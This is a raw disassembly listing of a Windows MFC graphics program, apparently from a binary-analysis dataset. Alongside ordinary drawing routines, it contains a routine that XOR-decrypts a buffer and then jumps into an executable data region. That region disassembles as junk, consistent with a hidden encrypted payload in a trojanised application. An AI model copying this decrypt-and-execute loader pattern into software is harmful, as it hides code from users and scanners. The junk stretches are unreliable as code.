sub_40102c
push ebp
mov ebp esp
fild [ ebp + 0xc ]
fild [ ebp + 0x10 ]
push esi
mov esi ecx
mov eax [ ebp + 0x14 ]
push edi
fadd [ esi + 0x18 ]
fld st1
fmul [ esi + 0x8 ]
cdq
fdiv st1
sub eax edx
sar eax 0x1
mov [ ebp + 0xc ] eax
fild [ ebp + 0xc ]
faddp st1
call _ftol
fld st1
fmul [ esi + 0x10 ]
mov edi eax
mov eax [ ebp + 0x18 ]
cdq
fdiv st1
sub eax edx
sar eax 0x1
mov [ ebp + 0xc ] eax
fild [ ebp + 0xc ]
faddp st1
call _ftol
mov ecx eax
mov eax [ ebp + 0x8 ]
fstp st0
mov [ eax ] edi
pop edi
fstp st0
mov [ eax + 0x4 ] ecx
pop esi
pop ebp
retn 0x14
sub_40109b
push ebp
mov ebp esp
sub esp 0x10
fld [ ebp + 0x8 ]
push esi
mov esi ecx
push ecx
push ecx
fstp [ esp ]
call cos
fmul [ esi + 0x8 ]
fstp [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call sin
fmul [ esi + 0x10 ]
fsubr [ ebp - 0x8 ]
fstp [ ebp - 0x10 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call sin
fmul [ esi + 0x8 ]
fstp [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call cos
fmul [ esi + 0x10 ]
pop ecx
pop ecx
fadd [ ebp - 0x8 ]
fld [ ebp - 0x10 ]
fstp [ esi + 0x8 ]
fstp [ esi + 0x10 ]
pop esi
leave
retn 0x8
sub_401125
and eax 0x6301e283
loope rwxdata
mov [ 0x3f8068cf ] al
inc eax
sbb ecx [ edx ]
bound ebp [ esi + 0x6fc95eb5 ]
shl [ eax + 0x51 ] cl
push cs
test eax 0xdbbf3b42
push cs
in al 0xc5
push ss
or dl [ 0xffffffffb22ab66f ]
js rwxdata
out 0xd6 al
push edx
cmpsd [ esi ] [ edi ]
int 0x66
imul ebx edi 0xffffffd7
add bl [ ebx - 0x3a ]
adc eax 0x65bdd54a
shl [ eax + 0x74 ] cl
shl [ eax + 0x53 ] cl
jns rwxdata
nop
xor al 0x0
add ah bl
dec esi
or ch bl
pop ebp
clc
fld [ ebp + 0x8 ]
fstp [ esp ]
call cos
fmul [ esi + 0x10 ]
pop ecx
pop ecx
fadd [ ebp - 0x8 ]
fld [ ebp - 0x10 ]
fstp [ esi + 0x8 ]
fstp [ esi + 0x10 ]
pop esi
leave
retn 0x8
push ecx
jbe rwxdata
mov edi 0xc4ef0e8d
dec ebx
pushfd
cmp [ esi ] 0xa2561ba
pushad
jg rwxdata
aas
cmp cl [ ebp - 0x74 ]
out 0xcc eax
mov cl 0x63
jle rwxdata
cmp al 0xb2
fisttp [ ecx * 4 + 0x5132db8d ]
and edi esi
jle rwxdata
xor eax 0x493ed30b
mov bl 0x98
push ecx
dec edx
call 0xffffffffe69f7887
fisttp [ ecx ]
pushad
sub [ edi - 0x2b ] 0x8d
cmc
adc [ ebx - 0x5c ] 0x14
cli
lahf
jg rwxdata
adc [ esi ] 0xffffffb5
dec edx
push esp
sbb ecx 0xa246a11
xor [ edi - 0x57 ] bh
bound ecx [ ebp + 0x2a16283 ]
xor al 0x7a
dec ebx
lahf
imul ebp [ esi + 0x2653bc62 ] 0x4b
pushad
and al 0xa
pushad
and [ eax + 0x3c ] 0xb2
push edi
push esp
fdiv st5
lahf
nop
sbb [ edi + 0x5adc038d ] bh
mov edi 0xa76e7e63
cmc
neg [ ebp + 0x3f ]
shl [ gs : eax + 0x74 ] cl
shr cl cl
mov [ 0x3f806ac9 ] al
push edi
mov bh 0x83
bound ebp [ esi - 0x1e35fcac ]
shl [ eax - 0xb ] cl
dec ebx
dec ecx
cld
sub bh [ edi - 0x3471c76d ]
lodsb [ esi ]
arpl [ edx + 0x37 ] si
aas
mov bh [ ecx ]
or ah cl
lodsd [ esi ]
inc ecx
loopne rwxdata
mov esp 0x5f3f7e63
out 0x61 al
or esp [ eax - 0x80 ]
outsd
inc eax
sbb edi [ esi + 0x62 ]
scasb [ edi ]
mov ch 0x8b
jns rwxdata
cmp edi [ edi - 0x3a1bf125 ]
mov [ ebp + 0xe ] cs
fild [ edx ]
inc ebp
pushfd
adc esi 0xa246fa6
xchg ebx eax
sub cl [ edi + edi * 2 ]
add [ esi ] bh
and bl [ esi + 0x4a ]
pushfd
pop eax
cmpsd [ esi ] [ edi ]
mov ah 0xa1
cmp [ edi ] 0xbf
jb rwxdata
cmpsd [ esi ] [ edi ]
dec ebp
push ecx
jmp 0xffffffffe66362ea
out 0xdf al
or [ eax - 0x80 ] esp
outsd
aad 0x8d
sbb eax 0xffffff8c
lds edx [ ebx + esi * 2 + 0x6f ]
pop eax
mov [ eax ] bl
jo rwxdata
test al 0x54
shr bh cl
mov [ 0x3f8062cb ] al
xlat
mov esp 0x38ae6282
in eax 0xee
outsb
shl [ eax + 0x74 ] cl
xchg esi esp
inc ebp
cmp eax 0x9dd38dbf
cmp [ ebx ] bl
jle rwxdata
add ebp edi
jg rwxdata
aas
mov edi 0x514df672
cmp dl 0x72
mov edi 0x50263e0e
inc eax
out dx al
call 0x7100a619
mov ecx 0xdb9ae2ea
cmc
adc al 0xf4
dec edi
or [ ebx + 0x5 ] 0x8d
movsb [ edi ] [ esi ]
mov ch 0x63
jl rwxdata
0xf5db9ae2 0xf414
adc eax 0x600ba8e6
in al 0x22
jecxz rwxdata
add al 0x40
jb rwxdata
pushad
retn
rcr ah 0xe6
movsd [ edi ] [ esi ]
sub esi ecx
popfd
adc [ eax + 0xa2460d2 ] 0xb78706a6
lea eax [ ebx - 0x68f4d19d ]
je rwxdata
mov eax [ 0x7f600a26 ]
push esp
dec edx
pushfd
jl rwxdata
and al 0xa
cmpsb [ esi ] [ edi ]
push es
xchg [ edi + 0x2e63838d ] esi
or edx [ edi + 0x61d26f74 ]
sub ecx [ edi - 0x40c07f18 ]
push cs
push eax
0x3f806aff 0xf8be
stosd [ edi ]
loope rwxdata
outsd
shl [ ecx - 0x25 ] cl
mov edi 0x40c07a50
add [ esi ] al
daa
push ebx
dec edx
pushfd
cmp [ cs : 0x6000d2f6 ] ebp
cmp [ edx + 0x2907827f ] 0xad
mov ch 0x63
xchg ebp eax
push esp
pop ecx
in eax dx
pushad
hlt
shl [ ecx + 0x2b ] cl
mov ah 0x63
jle rwxdata
rol [ eax + 0x72 ] 0x45
in al 0x5a
mov edi 0x396f7e63
enter 0xb7a5 0x50
jpe rwxdata
cmp [ edx + 0x7e ] esp
outsd
sub eax 0xd6f53215
inc ecx
cmp eax 0xe40c8dbf
and dh [ ebx - 0x5eab5782 ]
or ah [ es : eax + 0x7f ]
sub_401feb
pushfd
lodsd [ esi ]
rcr bl 0x1
mov cl [ esi - 0x6c6a741 ]
mov al [ 0x6fcb690e ]
out dx al
test al 0x81
popad
fisttp [ edx + 0x4796bf86 ]
cli
fimul [ esi ]
imul eax ebx 0x40c33a6f
inc ebx
fisttp [ edx - 0x3174002 ]
sub [ ecx + 0xe ] ah
imul esi [ edi + 0x2fad5d6f ] 0xf28adb92
mov edi 0x42627149
outsb
imul edx ebx 0xe79e536f
mov edx 0xbf968abb
dec ecx
shl [ ecx - 0x1496f163 ] cl
outsd
aad 0x56
xlat
adc ebx ebx
mov dl [ esi ]
mov edi 0x69bc0821
push cs
imul edi edi 0x10f0c6f
aam 0xdb
mov ch [ esi - 0x41 ]
cmp al 0xde
mov dl 0xf5
push cs
imul ebp [ ebx ] 0xad4d0d6f
xchg bl bl
mov ah [ esi - 0x41 ]
push ds
hlt
sub_402441
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
push esi
call Ordinal_MFC42_823
push esi
mov edi eax
push [ ebp + 0x8 ]
push edi
call memcpy
mov eax esi
mov edx edi
shr eax 0x4
add esp 0x10
add edi 0x10
dec eax
test eax eax
jbe rwxdata
add esi 0xfffffff0
xor ecx ecx
test esi esi
jbe rwxdata
push ebx
mov ecx edi
mov [ ebp + 0x10 ] eax
pop edi
pop esi
pop ebp
retn
sub edi rwxdata
mov bl [ eax + edx ]
xor [ ecx + eax ] bl
inc eax
cmp eax 0x10
jl rwxdata
add ecx 0x10
dec [ ebp + 0x10 ]
jne rwxdata
mov dl [ edi + ecx + rwxdata ]
lea eax [ ecx + rwxdata ]
xor dl 0xc3
inc ecx
cmp ecx esi
mov [ eax ] dl
jb rwxdata
xor eax eax
pop ebx
sub_4024f5
push esi
mov esi 0x1341
push esi
call Ordinal_MFC42_823
mov eax rwxdata
push esi
push eax
push eax
call sub_402441
add esp 0x10
mov esi 0xff82
push 0x25
pop eax
sub esi 0x64
dec eax
jne rwxdata
mov eax sub_401125
call eax
mov eax esi
pop esi
retn
sub_40252a
push ebp
mov ebp esp
mov eax 0x9c58
call sub_404580
push ebx
push esi
push edi
push 0x64
mov [ ebp - 0x18 ] ecx
lea esi [ ebp - 0x9c58 ]
pop ebx
call [ rand@IAT ]
push 0xa
cdq
pop ecx
idiv ecx
mov [ esi ] eax
add esi 0x4
dec edi
jne rwxdata
dec ebx
jne rwxdata
push 0x64
pop edi
cmp [ ebp + 0x8 ] 0x63
jg rwxdata
pop edi
pop esi
pop ebx
leave
retn 0x4
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jle rwxdata
push [ ebp - 0x4 ]
call Ordinal_MFC42_823
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea esi [ ebp - 0x9c58 ]
inc [ ebp - 0x8 ]
add esi 0x4
cmp [ ebp - 0x8 ] 0x64
jl rwxdata
cmp ebx [ ebp - 0x4 ]
jle rwxdata
push 0x0
call [ Sleep@IAT ]
mov edi [ esi ]
and [ ebp - 0xc ] 0x0
test edi edi
jle rwxdata
inc ebx
cmp ebx 0x64
jl rwxdata
push ebx
push [ ebp - 0x4 ]
jmp rwxdata
push ebx
call Ordinal_MFC42_823
and [ ebp - 0x8 ] 0x0
pop ecx
mov [ ebp - 0x14 ] eax
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jl rwxdata
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] edi
jl rwxdata
cmp eax [ ebp - 0x4 ]
jne rwxdata
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call memcpy
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp ebx eax
jne rwxdata
jmp rwxdata
cmp [ ebp - 0x4 ] 0xa
jle rwxdata
mov ecx [ ebp - 0x18 ]
push 0x65
pop eax
cmp [ ecx + 0x4 ] eax
jne rwxdata
mov [ ecx + 0x4 ] eax
call sub_4024f5
sub_4026a2
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
pop edi
pop esi
retn 0x4
sub_402732
mov eax sub_404820
call sub_4045f4
push ecx
push ecx
push esi
push edi
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_2414
or [ ebp - 0x4 ] 0xffffffff
mov ecx edi
mov [ esi ] r--data
call sub_4029a7
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4027aa
mov eax sub_40483c
call sub_4045f4
sub esp 0x18
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0xc ]
add ecx 0x4
push ecx
mov ecx esi
mov eax [ esi ]
call [ eax + 0x30 ]
mov edi rw-data
push 0x0
push edi
mov ecx esi
mov [ ebp - 0x14 ] eax
call Ordinal_MFC42_2754
push 0x1
mov ecx esi
call Ordinal_MFC42_5875
mov eax [ esi ]
push 0xffff
mov ecx esi
call [ eax + 0x38 ]
push rw-data
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_537
mov eax [ ebp + 0xc ]
mov edx [ esi ]
and [ ebp - 0x4 ] 0x0
push 0x25
mov ecx [ eax - 0x8 ]
push edi
push ecx
push eax
mov ecx esi
call [ edx + 0x70 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_800
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x20 ]
sub eax ecx
push rw-data
cdq
sub eax edx
sar eax 0x1
lea eax [ ecx + eax - 0x50 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
call Ordinal_MFC42_537
mov eax [ ebp - 0x10 ]
mov edx [ esi ]
lea edi [ ebp - 0x24 ]
push 0x21
mov ecx [ eax - 0x8 ]
push edi
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call [ edx + 0x70 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_800
mov eax [ esi ]
push [ ebp - 0x14 ]
mov ecx esi
call [ eax + 0x30 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_40288c
push esi
lea esi [ ecx + 0x4 ]
test esi esi
je rwxdata
push 0x0
push rw-data
push 0x104
mov ecx esi
call Ordinal_MFC42_2243
pop esi
retn
cmp [ esi + 0x4 ] 0x0
je rwxdata
mov ecx esi
call Ordinal_MFC42_2414
sub_4028fa
mov eax sub_404850
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_402949
mov eax sub_404864
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_402a32
mov eax sub_404880
call sub_4045f4
push ecx
push ecx
push esi
push edi
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_2414
or [ ebp - 0x4 ] 0xffffffff
mov ecx edi
mov [ esi ] r--data
call sub_4029a7
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_402a8b
mov eax sub_40489c
call sub_4045f4
sub esp 0x18
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0xc ]
add ecx 0x4
push ecx
mov ecx esi
mov eax [ esi ]
call [ eax + 0x30 ]
mov edi rw-data
push 0x0
push edi
mov ecx esi
mov [ ebp - 0x14 ] eax
call Ordinal_MFC42_2754
push 0x1
mov ecx esi
call Ordinal_MFC42_5875
mov eax [ esi ]
push 0xffff
mov ecx esi
call [ eax + 0x38 ]
push rw-data
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_537
mov eax [ ebp + 0xc ]
mov edx [ esi ]
and [ ebp - 0x4 ] 0x0
push 0x25
mov ecx [ eax - 0x8 ]
push edi
push ecx
push eax
mov ecx esi
call [ edx + 0x70 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_800
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x20 ]
sub eax ecx
push rw-data
cdq
sub eax edx
sar eax 0x1
lea eax [ ecx + eax - 0x50 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
call Ordinal_MFC42_537
mov eax [ ebp - 0x10 ]
mov edx [ esi ]
lea edi [ ebp - 0x24 ]
push 0x21
mov ecx [ eax - 0x8 ]
push edi
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call [ edx + 0x70 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_800
mov eax [ esi ]
push [ ebp - 0x14 ]
mov ecx esi
call [ eax + 0x30 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_402b6e
push esi
lea esi [ ecx + 0x4 ]
test esi esi
je rwxdata
push 0x0
push rw-data
push 0xa0
mov ecx esi
call Ordinal_MFC42_2243
pop esi
retn
cmp [ esi + 0x4 ] 0x0
je rwxdata
mov ecx esi
call Ordinal_MFC42_2414
sub_402c0c
mov eax sub_4048b8
call sub_4045f4
push ecx
push ecx
push esi
push edi
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_2414
or [ ebp - 0x4 ] 0xffffffff
mov ecx edi
mov [ esi ] r--data
call sub_4029a7
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_402c5f
movsx eax [ esp + 0x8 ]
push esi
sub eax 0x70
mov esi ecx
je rwxdata
call sub_403073
dec eax
jne rwxdata
pop esi
retn 0x8
call sub_402a85
jmp rwxdata
push eax
mov ecx esi
push [ esp + 0xc ]
call sub_4029ae
sub_402c91
mov eax sub_4048dc
call sub_4045f4
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
add ecx 0x4
mov eax [ ebx ]
push edi
push ecx
mov ecx ebx
call [ eax + 0x30 ]
mov esi rw-data
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
push rw-data
mov ecx ebx
mov [ ebp - 0x14 ] eax
movsd [ edi ] [ esi ]
call Ordinal_MFC42_2754
mov eax [ ebx ]
push 0xffff
mov ecx ebx
call [ eax + 0x38 ]
push 0x1
mov ecx ebx
pop esi
push esi
call Ordinal_MFC42_5875
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x20 ]
sub eax ecx
push rw-data
cdq
sub eax edx
sar eax 0x1
lea eax [ ecx + eax - 0x28 ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x20 ] eax
call Ordinal_MFC42_537
mov eax [ ebp + 0xc ]
mov edx [ ebx ]
and [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0x24 ]
mov ecx [ eax - 0x8 ]
push 0x21
push edi
push ecx
push eax
mov ecx ebx
call [ edx + 0x70 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_800
add [ ebp - 0x20 ] 0x28
push rw-data
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_537
mov eax [ ebp + 0xc ]
mov edx [ ebx ]
mov [ ebp - 0x4 ] esi
lea esi [ ebp - 0x24 ]
mov ecx [ eax - 0x8 ]
push 0x21
push esi
push ecx
push eax
mov ecx ebx
call [ edx + 0x70 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_800
mov eax [ ebx ]
push 0xffffff
mov ecx ebx
call [ eax + 0x38 ]
add [ ebp - 0x20 ] 0x8c
push rw-data
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_537
mov eax [ ebp - 0x10 ]
mov edx [ ebx ]
lea esi [ ebp - 0x24 ]
push 0x21
mov ecx [ eax - 0x8 ]
push esi
push ecx
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call [ edx + 0x70 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_800
mov eax [ ebx ]
push [ ebp - 0x14 ]
mov ecx ebx
call [ eax + 0x30 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_402dc1
mov eax sub_4048f1
call sub_4045f4
push ecx
push 0x1e4
call Ordinal_MFC42_823
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je rwxdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_402e0e
sub_402e0e
mov eax sub_404912
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call Ordinal_MFC42_366
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc4 ]
call Ordinal_MFC42_529
lea ecx [ esi + 0x144 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_554
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov [ esi + 0xc0 ] 0x1
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_402e7d
mov eax sub_404932
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x144 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_807
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc4 ]
call Ordinal_MFC42_796
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call Ordinal_MFC42_674
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_402ecd
push esi
push edi
push [ esp + 0xc ]
mov esi ecx
call Ordinal_MFC42_4457
cmp eax 0xffffffff
je rwxdata
or eax 0xffffffff
lea edi [ esi + 0xc4 ]
push 0xe801
push 0x50008200
push esi
mov ecx edi
call Ordinal_MFC42_2117
test eax eax
je rwxdata
push 0x4
push rw-data
mov ecx edi
call Ordinal_MFC42_6000
test eax eax
je rwxdata
xor eax eax
jmp rwxdata
pop edi
pop esi
retn 0x4
sub_402f8d
mov eax sub_40495a
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_402982
xor eax eax
mov [ esi + 0x4 ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] r--data
lea ecx [ esi + 0x14 ]
mov [ ebp - 0x4 ] 0x2
call sub_403532
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_402ff9
mov eax sub_404992
call sub_4045f4
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x14 ]
mov [ ebp - 0x4 ] 0x2
call sub_40357a
lea edi [ esi + 0xc ]
mov [ ebp - 0x14 ] edi
mov [ edi ] r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_2414
mov ebx r--data
mov [ edi ] ebx
lea edi [ esi + 0x4 ]
mov [ ebp - 0x14 ] edi
mov [ edi ] r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_2414
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov [ edi ] ebx
call sub_4029a7
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
sub_403079
movsx eax [ esp + 0x8 ]
push esi
sub eax 0x31
mov esi ecx
je rwxdata
call sub_402785
dec eax
jne rwxdata
pop esi
retn 0x8
call sub_402c8b
jmp rwxdata
push eax
mov ecx esi
push [ esp + 0xc ]
call sub_4029ae
sub_4030b0
mov eax sub_4049bc
call sub_4045f4
sub esp 0x3c
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x20 ]
mov ebx ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
call Ordinal_MFC42_323
mov esi [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
test esi esi
jne rwxdata
mov eax [ esi + 0x4 ]
xor eax eax
jmp rwxdata
push eax
push [ ebp - 0x2c ]
call Ordinal_MFC42_5785
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x48 ]
push eax
push 0x18
push [ ebx + 0x10 ]
call [ GetObjectA@IAT ]
push 0x0
push rw-data
mov ecx esi
call Ordinal_MFC42_2754
push esi
mov ecx ebx
call sub_4032da
mov eax [ rw-data ]
push 0xcc0020
sub eax [ rw-data ]
push 0x0
push 0x0
cdq
sub eax edx
mov ecx eax
mov eax [ ebp - 0x40 ]
cdq
sub eax edx
sar ecx 0x1
sar eax 0x1
sub ecx eax
mov eax [ rw-data ]
sub eax [ rw-data ]
cdq
sub eax edx
mov edi eax
mov eax [ ebp - 0x44 ]
cdq
sub eax edx
sar edi 0x1
sar eax 0x1
sub edi eax
lea eax [ ebp - 0x30 ]
neg eax
sbb eax eax
and eax [ ebp - 0x2c ]
push eax
push [ ebp - 0x40 ]
push [ ebp - 0x44 ]
push ecx
push edi
push [ esi + 0x4 ]
call [ BitBlt@IAT ]
mov eax [ esi ]
push 0xffff
mov ecx esi
call [ eax + 0x38 ]
push 0x1
mov ecx esi
call Ordinal_MFC42_5875
mov eax [ ebp - 0x18 ]
push 0x4
sub eax [ ebp - 0x20 ]
pop ecx
push 0x0
cdq
idiv ecx
neg eax
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ InflateRect@IAT ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
sub eax ecx
push 0x81
cdq
sub eax edx
sar eax 0x1
lea eax [ ecx + eax + 0x28 ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
call Ordinal_MFC42_537
mov eax [ ebp + 0xc ]
mov edx [ esi ]
lea edi [ ebp - 0x20 ]
push 0x11
mov ecx [ eax - 0x8 ]
push edi
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call [ edx + 0x70 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_800
mov eax [ esi ]
push 0xffffff
mov ecx esi
call [ eax + 0x38 ]
mov eax [ esi ]
add ebx 0x4
push ebx
mov ecx esi
call [ eax + 0x30 ]
mov edi eax
mov eax [ rw-data ]
sub eax [ rw-data ]
push 0x4
pop ecx
cdq
idiv ecx
push rw-data
lea ecx [ ebp + 0xc ]
sub [ ebp - 0x1c ] eax
sub [ ebp - 0x14 ] eax
call Ordinal_MFC42_537
mov eax [ ebp + 0xc ]
mov edx [ esi ]
lea ebx [ ebp - 0x20 ]
push 0x1
mov ecx [ eax - 0x8 ]
push ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call [ edx + 0x70 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_800
add [ ebp - 0x1c ] 0x3c
add [ ebp - 0x14 ] 0x3c
push rw-data
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_537
mov eax [ ebp + 0xc ]
mov edx [ esi ]
lea ebx [ ebp - 0x20 ]
push 0x1
mov ecx [ eax - 0x8 ]
push ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call [ edx + 0x70 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_800
mov eax [ ebp - 0x10 ]
test eax eax
je rwxdata
mov eax [ eax + 0x4 ]
push eax
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ ebp - 0x30 ]
call Ordinal_MFC42_1640
lea eax [ ebx + 0xc ]
test eax eax
je rwxdata
push eax
push [ ebp - 0x2c ]
call Ordinal_MFC42_5785
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x30 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call Ordinal_MFC42_640
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov eax [ eax + 0x4 ]
sub_4032da
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
add ecx 0x14
call sub_40371e
mov esi eax
xor edi edi
cmp [ esi + 0x8 ] edi
jle rwxdata
pop edi
pop esi
leave
retn 0x4
push ebx
mov eax [ esi + 0x4 ]
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov ebx [ eax + edi * 4 ]
mov eax [ rw-data ]
sub eax [ rw-data ]
push ecx
mov ecx ebx
push eax
cdq
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x10 ]
push 0x100
push eax
call sub_40102c
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov ecx ebx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_40352e
push eax
mov eax [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ eax + 0x4 ]
call [ SetPixel@IAT ]
inc edi
cmp edi [ esi + 0x8 ]
jl rwxdata
pop ebx
sub_403360
push esi
push edi
mov edi ecx
